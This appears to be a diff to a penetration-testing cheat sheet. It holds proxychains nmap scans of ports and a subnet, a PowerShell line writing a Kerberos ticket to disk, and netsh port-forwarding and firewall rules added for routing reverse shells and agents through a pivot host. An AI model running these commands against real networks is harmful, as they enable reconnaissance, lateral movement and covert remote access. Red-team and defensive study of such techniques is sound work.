@@ -47,3 +47,8 @@ seq 1 1000 | xargs -P 50 -I{} proxychains nmap -p {} -sT -Pn --open -n -T4 --min
 seq 1 254 | xargs -P 50 -I{} proxychains nmap -p 80,443,3389,445,22 -sT -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --oG proxychains_nmap --append-output 192.168.1.{}
 
 [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))
+
+# reverse port forwarding for reverse shells agents etc
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.58.128 connectport=8080 connectaddress=192.168.57.140
+netsh advfirewall firewall add rule name="PortForwarding 8080" dir=in action=allow protocol=TCP localport=8080
+netsh advfirewall firewall add rule name="PortForwarding 8080" dir=out action=allow protocol=TCP localport=8080
